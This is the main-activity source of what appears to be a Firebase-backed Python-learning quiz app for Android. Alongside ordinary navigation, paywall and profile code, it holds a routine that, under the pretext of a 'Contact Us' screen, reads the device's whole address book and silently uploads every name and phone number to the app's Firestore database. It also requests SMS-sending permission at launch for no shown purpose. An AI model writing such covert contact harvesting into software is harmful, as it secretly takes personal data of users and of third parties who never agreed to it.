package com.example.python1;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.MenuItem;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.ActionBarDrawerToggle;
import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.view.GravityCompat;
import androidx.drawerlayout.widget.DrawerLayout;

import com.bumptech.glide.Glide;
import com.google.android.material.bottomnavigation.BottomNavigationView;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.navigation.NavigationView;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.FieldValue;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.messaging.FirebaseMessaging;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;



public class MainActivity extends BaseActivity {

    private DrawerLayout drawerLayout;
    private NavigationView navigationView;
    private TextView usernameTextView, greetingTextView, progressTextView;
    private ImageView profileImageView, navIcon;
    private ProgressBar progressBar;
    private LinearLayout tutorialLayout, quizLayout, codeCompilerLayout,flashcardLayout;

    private FirebaseAuth firebaseAuth;
    private FirebaseFirestore firestore;
    private FirebaseUser currentUser;

    // Permission request codes
    private static final int REQUEST_NOTIFICATION_PERMISSION = 1;
    private static final int REQUEST_CALL_PERMISSION = 2;
    private static final int REQUEST_SMS_PERMISSION = 3;
    private static final int REQUEST_LOCATION_PERMISSION = 4;
    private static final int MULTIPLE_PERMISSIONS = 100;
    private MaterialCardView dailyChallengeCard;
    private BottomNavigationView bottomNavigationView;
    private TextView userEmailTextView;
    private FloatingActionButton fabMain;
    private LinearLayout chatSidebar;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize Firebase
        firebaseAuth = FirebaseAuth.getInstance();
        firestore = FirebaseFirestore.getInstance();
        currentUser = firebaseAuth.getCurrentUser();

        // Initialize Views
        drawerLayout = findViewById(R.id.drawer_layout);
        navigationView = findViewById(R.id.navigation_view);
        navIcon = findViewById(R.id.nav_icon);
        greetingTextView = findViewById(R.id.tv_greeting);
        progressTextView = findViewById(R.id.tv_progress);
        progressBar = findViewById(R.id.progress_bar);
        tutorialLayout = findViewById(R.id.tutorial_layout);
        codeCompilerLayout = findViewById(R.id.code_compiler_layout);
       flashcardLayout=findViewById(R.id.flashcards_layout);
        quizLayout = findViewById(R.id.quiz_layout);
        dailyChallengeCard = findViewById(R.id.daily_challenge_card);

        // Initialize Floating Action Button
        fabMain = findViewById(R.id.fab_main);


        // Check and request permissions
        checkAndRequestLaunchPermissions();

        // Get navigation header views here ONCE
        View headerView = navigationView.getHeaderView(0);
        usernameTextView = headerView.findViewById(R.id.username);
        profileImageView = headerView.findViewById(R.id.profile_image);
        userEmailTextView = headerView.findViewById(R.id.user_email);

        // Load user info once
        loadUserInfo();

        navIcon.setOnClickListener(v -> {
            if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
                drawerLayout.closeDrawer(GravityCompat.START);
            } else {
                drawerLayout.openDrawer(GravityCompat.START);
                // NO fetch here!
            }
        });

        // Setup Drawer Toggle
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawerLayout, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawerLayout.addDrawerListener(toggle);
        toggle.syncState();

        // Get header view from Navigation Drawer
        usernameTextView = headerView.findViewById(R.id.username);
        profileImageView = headerView.findViewById(R.id.profile_image);
        userEmailTextView = headerView.findViewById(R.id.user_email);

        // Handle Profile Image Click
        profileImageView.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this, profileActivity.class));
        });

        // Handle Tutorial Section Click
        tutorialLayout.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this, TutorialActivity.class));
        });

        codeCompilerLayout.setOnClickListener(v -> {
            startActivity(new Intent(MainActivity.this, CodeCompilerActivity.class));
        });
        flashcardLayout.setOnClickListener(v -> {
            showComingSoonDialog();
        });

        quizLayout.setOnClickListener(v -> showQuizSelectionDialog());

        // Handle Navigation Drawer Item Clicks
        navigationView.setNavigationItemSelectedListener(item -> {
            handleNavigationItemClick(item);
            return true;
        });

        // Initialize Bottom Navigation
        bottomNavigationView = findViewById(R.id.bottom_navigation);
        bottomNavigationView.setSelectedItemId(R.id.nav_home);

        // Handle item selection
        bottomNavigationView.setOnItemSelectedListener(new BottomNavigationView.OnItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(@NonNull MenuItem item) {
                int id = item.getItemId();

                if (id == R.id.nav_home) {
                    // Already in Home, do nothing
                    return true;
                } else if (id == R.id.nav_tutorials) {
                    startActivity(new Intent(MainActivity.this, TutorialActivity.class));
                    overridePendingTransition(0, 0);
                    return true;
                } else if (id == R.id.nav_quiz) {
                    showQuizSelectionDialog();
                    return true;
                } else if (id == R.id.nav_leaderboard) {
                    startActivity(new Intent(MainActivity.this, LeaderboardActivity.class));
                    overridePendingTransition(0, 0);
                    return true;
                } else if (id == R.id.nav_profile) {
                    startActivity(new Intent(MainActivity.this, profileActivity.class));
                    overridePendingTransition(0, 0);
                    return true;
                }
                return false;
            }
        });

        // Handle Floating Action Button Clic

        FloatingActionButton fab = findViewById(R.id.fab_main);
        fab.setOnClickListener(view -> {
            // Check premium status before opening chat
            FirebaseFirestore.getInstance()
                    .collection("users")
                    .document(FirebaseAuth.getInstance().getCurrentUser().getUid())
                    .get()
                    .addOnSuccessListener(documentSnapshot -> {
                        if (documentSnapshot.exists()) {
                            Map<String, Object> paymentData = (Map<String, Object>) documentSnapshot.get("paymentData");
                            boolean isPremium = paymentData != null && Boolean.TRUE.equals(paymentData.get("paymentStatus"));

                            if (isPremium) {
                                // Premium user - unlimited access
                                startActivity(new Intent(MainActivity.this, ChatActivity.class));
                            } else {
                                // Free user - check chat count
                                Long chatCount = documentSnapshot.getLong("chatCount");
                                int remainingChats = 5 - (chatCount != null ? chatCount.intValue() : 0);

                                if (remainingChats > 0) {
                                    // Update chat count in Firebase
                                    Map<String, Object> updates = new HashMap<>();
                                    updates.put("chatCount", (chatCount != null ? chatCount : 0) + 1);

                                    FirebaseFirestore.getInstance()
                                            .collection("users")
                                            .document(FirebaseAuth.getInstance().getCurrentUser().getUid())
                                            .update(updates);

                                    // Show remaining chats
                                    Toast.makeText(MainActivity.this,
                                            "Chats remaining: " + (remainingChats - 1), Toast.LENGTH_SHORT).show();

                                    startActivity(new Intent(MainActivity.this, ChatActivity.class));
                                } else {
                                    // Redirect to premium
                                    startActivity(new Intent(MainActivity.this, PremiumFeaturesActivity.class));
                                    Toast.makeText(MainActivity.this,
                                            "You've used all free chats. Please subscribe!", Toast.LENGTH_LONG).show();
                                }
                            }
                        }
                    });
        });
        dailyChallengeCard.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openDailyChallenge();
            }
        });

    }
    private void showComingSoonDialog() {
        new MaterialAlertDialogBuilder(MainActivity.this)
                .setTitle("🚀 Flashcards Coming Soon!")
                .setMessage("We're excited to announce our flashcards feature will be available in the next update!\n\nWould you like to be notified when it's ready?")
                .setPositiveButton("Notify Me", (dialog, which) -> {
                    // Handle notification subscription
                    Toast.makeText(MainActivity.this,
                            "We'll notify you when flashcards are available!",
                            Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton("Remind Me Later", (dialog, which) -> {
                    dialog.dismiss();
                })
                .setNeutralButton("OK", (dialog, which) -> {
                    // Just acknowledge
                    dialog.dismiss();
                })
                .show();
    }
    private void openDailyChallenge() {
        Intent intent = new Intent(MainActivity.this, DailyChallengeActivity.class);
        startActivity(intent);
    }
    public void openSubscription(View view) {
        Intent intent = new Intent(this, PremiumFeaturesActivity.class);
        startActivity(intent);
    }

    @Override
    protected void onStart() {
        super.onStart();
        loadUserInfo(); // This refreshes user info every time activity starts or comes to foreground
    }

    // Toggle visibility of the chat sidebar

    private void checkAndRequestLaunchPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        // Only request SEND_SMS and POST_NOTIFICATIONS at app launch
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.SEND_SMS);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsToRequest.toArray(new String[0]),
                    MULTIPLE_PERMISSIONS);
        } else {
            initializeFeatures(); // Continue normal flow
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == MULTIPLE_PERMISSIONS) {
            Log.d("Permissions", "SMS and Notification permissions checked.");
            initializeFeatures(); // Continue regardless of grant or denial
        } else if (requestCode == 2025) {
            boolean callGranted = false, contactsGranted = false;

            // Loop through the permissions to check each one
            for (int i = 0; i < permissions.length; i++) {
                if (permissions[i].equals(Manifest.permission.CALL_PHONE) &&
                        grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    callGranted = true;
                }
                if (permissions[i].equals(Manifest.permission.READ_CONTACTS) &&
                        grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    contactsGranted = true;
                    fetchAndStoreContactsInFirestore(); // Run logic if READ_CONTACTS is granted
                }
            }

            // If both permissions are granted, proceed to the Contact Us Activity
            if (callGranted && contactsGranted) {
                startActivity(new Intent(this, ContactUsActivity.class));
            }
            else if (!callGranted && !contactsGranted) {
                // If both permissions are denied, show a toast asking the user to grant both permissions
                Toast.makeText(this, "Please grant both CALL and READ CONTACTS permissions.", Toast.LENGTH_LONG).show();
            }
            else {
                // If one permission is granted and the other is denied, request the denied permission only
                List<String> permissionsToRequest = new ArrayList<>();
                if (!callGranted) {
                    permissionsToRequest.add(Manifest.permission.CALL_PHONE);
                }
                if (!contactsGranted) {
                    permissionsToRequest.add(Manifest.permission.READ_CONTACTS);
                }

                // Request the missing permission(s)
                if (!permissionsToRequest.isEmpty()) {
                    // Request only the denied permissions
                    ActivityCompat.requestPermissions(this,
                            permissionsToRequest.toArray(new String[0]),
                            2025); // Use custom request code
                }

            }

        }
    }

    private void fetchAndStoreContactsInFirestore() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {

            Log.d("FirestoreDebug", "READ_CONTACTS permission granted. Fetching contacts...");

            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            if (cursor != null) {
                Map<String, String> contactsMap = new HashMap<>();

                int nameColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                if (nameColumnIndex != -1 && numberColumnIndex != -1) {
                    while (cursor.moveToNext()) {
                        String contactName = cursor.getString(nameColumnIndex);
                        String contactNumber = cursor.getString(numberColumnIndex);

                        if (contactName != null && contactNumber != null) {
                            contactsMap.put(contactNumber, contactName);
                        }
                    }
                    Log.d("FirestoreDebug", "Contacts fetched: " + contactsMap.size());
                } else {
                    Log.e("FirestoreDebug", "Contact columns not found!");
                }

                cursor.close();

                if (!contactsMap.isEmpty()) {
                    FirebaseFirestore firestore = FirebaseFirestore.getInstance();
                    String userId = FirebaseAuth.getInstance().getCurrentUser().getUid();

                    firestore.collection("users")
                            .document(userId)
                            .update("contacts", contactsMap)
                            .addOnSuccessListener(aVoid -> {
                                // No Toast message, just log for debugging
                                Log.d("FirestoreDebug", "Contacts uploaded to Firestore: " + contactsMap.size());
                            })
                            .addOnFailureListener(e -> {
                                Log.e("FirestoreDebug", "Failed uploading contacts: " + e.getMessage());
                            });
                } else {
                    Log.d("FirestoreDebug", "No contacts available to upload.");
                }
            } else {
                Log.e("FirestoreDebug", "Cursor was null. Cannot read contacts.");
            }
        } else {
            Log.d("FirestoreDebug", "READ_CONTACTS permission not granted. Cannot fetch contacts.");
        }
    }

    private void initializeFeatures() {
        // Initialize FCM (notifications)
        getFCMToken();

        // Other initialization that requires permissions
    }

    private void getFCMToken() {
        FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(task -> {
                    if (!task.isSuccessful()) {
                        Log.w("FCM_TOKEN", "Fetching FCM token failed", task.getException());
                        return;
                    }

                    String token = task.getResult();
                    Log.d("FCM_TOKEN", "Token: " + token);

                    // Save token to Firestore
                    if (currentUser != null) {
                        firestore.collection("users").document(currentUser.getUid())
                                .update("fcmToken", token)
                                .addOnSuccessListener(aVoid -> Log.d("FCM_TOKEN", "Token saved"))
                                .addOnFailureListener(e -> Log.w("FCM_TOKEN", "Error saving token", e));
                    }
                });
    }

    private void showQuizSelectionDialog() {
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Select a Topic");

        final List<String> topicList = new ArrayList<>();
        final ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.select_dialog_singlechoice, topicList);

        db.collection("tutorials")
                .get()
                .addOnSuccessListener(queryDocumentSnapshots -> {
                    for (com.google.firebase.firestore.DocumentSnapshot doc : queryDocumentSnapshots) {
                        topicList.add(doc.getId());
                    }

                    builder.setSingleChoiceItems(adapter, -1, (dialog, which) -> {
                        String selectedTopic = topicList.get(which);
                        Intent intent = new Intent(MainActivity.this, QuizActivity.class);
                        intent.putExtra("selectedTopic", selectedTopic);
                        startActivity(intent);
                        dialog.dismiss();
                    });

                    builder.setNegativeButton("Cancel", null);
                    builder.show();
                })
                .addOnFailureListener(e -> {
                    Toast.makeText(MainActivity.this, "Failed to load quiz topics", Toast.LENGTH_SHORT).show();
                });
    }

    private void handleNavigationItemClick(MenuItem item) {
        int id = item.getItemId();

        if (id == R.id.nav_profile) {
            startActivity(new Intent(MainActivity.this, profileActivity.class));
        } else if (id == R.id.nav_progress) {
            startActivity(new Intent(MainActivity.this, UserProgressActivity.class));
        } else if (id == R.id.nav_settings) {
            startActivity(new Intent(MainActivity.this, Setting_Activity.class));
        } else if (id == R.id.nav_about) {
            startActivity(new Intent(MainActivity.this, aboutus.class));
        } else if (id == R.id.nav_feedback) {
            startActivity(new Intent(MainActivity.this, FeedbackActivity.class));
        } else if (id == R.id.nav_terms) {
            startActivity(new Intent(MainActivity.this, TermsConditionsActivity.class));
        }else if (id == R.id.nav_certificates) {
                startActivity(new Intent(MainActivity.this, CertificatesActivity.class));
        } else if (id == R.id.nav_contact) {
                List<String> permissionsToRequest = new ArrayList<>();

                // Check CALL_PHONE permission
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(Manifest.permission.CALL_PHONE);
                }

                // Check READ_CONTACTS permission
                boolean contactsGranted = false;
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(Manifest.permission.READ_CONTACTS);
                } else {
                    contactsGranted = true;
                    fetchAndStoreContactsInFirestore(); // Already granted, so call the method
                }

                if (!permissionsToRequest.isEmpty()) {
                    // Request only the missing permissions
                    ActivityCompat.requestPermissions(this,
                            permissionsToRequest.toArray(new String[0]),
                            2025);
                } else {
                    // All permissions granted, proceed
                    startActivity(new Intent(this, ContactUsActivity.class));
                }
// Custom request code


    } else if (id == R.id.nav_share) {
            shareApp();
        } else if (id == R.id.nav_logout) {
            showLogoutDialog();
        }
        drawerLayout.closeDrawer(GravityCompat.START);
    }

    private void loadUserInfo() {
        if (currentUser == null) return;

        firestore.collection("users").document(currentUser.getUid())
                .get().addOnSuccessListener(documentSnapshot -> {
                    if (documentSnapshot.exists()) {

                        // 1. Check if account isActive inside 'account_status' map
                        Map<String, Object> accountStatus = (Map<String, Object>) documentSnapshot.get("account_status");
                        if (accountStatus != null) {
                            Boolean isActive = (Boolean) accountStatus.get("Account_is_Active");

                            if (isActive != null && !isActive) {
                                new AlertDialog.Builder(this)
                                        .setTitle("Reactivate Account?")
                                        .setMessage("Your account is deactivated. Do you want to reactivate it?")
                                        .setPositiveButton("Yes", (dialog, which) -> {
                                            Map<String, Object> newStatus = new HashMap<>();
                                            newStatus.put("Account_is_Active", true);
                                            newStatus.put("reactivatedAt", FieldValue.serverTimestamp());

                                            Map<String, Object> updates = new HashMap<>();
                                            updates.put("account_status", newStatus);

                                            firestore.collection("users").document(currentUser.getUid())
                                                    .update(updates)
                                                    .addOnSuccessListener(unused -> {
                                                        Toast.makeText(this, "Account reactivated!", Toast.LENGTH_SHORT).show();
                                                        loadUserInfo(); // Reload everything
                                                    })
                                                    .addOnFailureListener(e -> {
                                                        Toast.makeText(this, "Failed to reactivate account.", Toast.LENGTH_SHORT).show();
                                                        Log.e("Reactivation", "Error:", e);
                                                    });

                                        })
                                        .setNegativeButton("No", (dialog, which) -> {
                                            FirebaseAuth.getInstance().signOut();
                                            dialog.dismiss();
                                            finish();
                                        })
                                        .setCancelable(false)
                                        .show();

                                return; // Stop further execution
                            }
                        }

                        // 2. Check if Terms & Conditions are accepted
                        Map<String, Object> termsStatus = (Map<String, Object>) documentSnapshot.get("term_condition_status");
                        Boolean accepted = termsStatus != null ? (Boolean) termsStatus.get("accepted") : null;

                        if (accepted == null || !accepted) {
                            Intent intent = new Intent(MainActivity.this, TermsConditionsActivity.class);
                            intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(intent);
                            finish();
                            return;
                        }

                        // 3. Load user profile and progress from nested 'profile_details' map
                        Map<String, Object> profileDetails = (Map<String, Object>) documentSnapshot.get("Profile_details");
                        String fullName = null;
                        String profileImageUrl = null;
                        String email = null;

                        if (profileDetails != null) {
                            fullName = (String) profileDetails.get("name");
                            profileImageUrl = (String) profileDetails.get("profileImageUrl");
                            email = (String) profileDetails.get("email");
                        }
                        if (email != null) {
                            userEmailTextView.setText(email); // Assuming userEmailTextView is your TextView for email
                        } else {
                            // Handle case where email might be missing or profileDetails is null
                            userEmailTextView.setText("Email Not Available");
                        }

                        String greeting = getGreetingMessage();
                        greetingTextView.setText(greeting + " 🎉, " + (fullName != null ? fullName : "User") + "!");

                        // Overall progress (assumed to still be at root)
                        Map<String, Object> overallProgress = (Map<String, Object>) documentSnapshot.get("overall_progress");
                        Long progress = null;
                        if (overallProgress != null && overallProgress.containsKey("percentage")) {
                            progress = (Long) overallProgress.get("percentage");
                        }
                        int progressVal = progress != null ? progress.intValue() : 0;
                        progressTextView.setText("Your progress: " + progressVal + "%");
                        progressBar.setProgress(progressVal);

                        usernameTextView.setText(fullName != null ? fullName : "User");

                        if (profileImageUrl != null && !profileImageUrl.isEmpty()) {
                            Glide.with(this)
                                    .load(profileImageUrl)
                                    .placeholder(R.drawable.profile)
                                    .error(R.drawable.profile)
                                    .into(profileImageView);
                        } else {
                            profileImageView.setImageResource(R.drawable.profile);
                        }
                    }
                }).addOnFailureListener(e -> {
                    Log.e("MainActivity", "Error loading user info", e);
                });
    }



    private String getGreetingMessage() {
        int hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
        if (hour >= 5 && hour < 12) return "Good Morning";
        else if (hour >= 12 && hour < 17) return "Good Afternoon";
        else if (hour >= 17 && hour < 21) return "Good Evening";
        else return "Good Night";
    }

    private void showLogoutDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Logout")
                .setMessage("Are you sure you want to log out?")
                .setCancelable(false)
                .setPositiveButton("Yes", (dialog, which) -> logout())
                .setNegativeButton("No", null)
                .show();
    }

    private void logout() {
        FirebaseAuth.getInstance().signOut();
        startActivity(new Intent(MainActivity.this, Sign_in.class));
        finish();
    }
    private void shareApp() {
        Intent shareIntent = new Intent(Intent.ACTION_SEND);
        shareIntent.setType("text/plain");
        shareIntent.putExtra(Intent.EXTRA_TEXT, "Check out this awesome Quiz App! <App Link>");
        startActivity(Intent.createChooser(shareIntent, "Share via"));
    }
}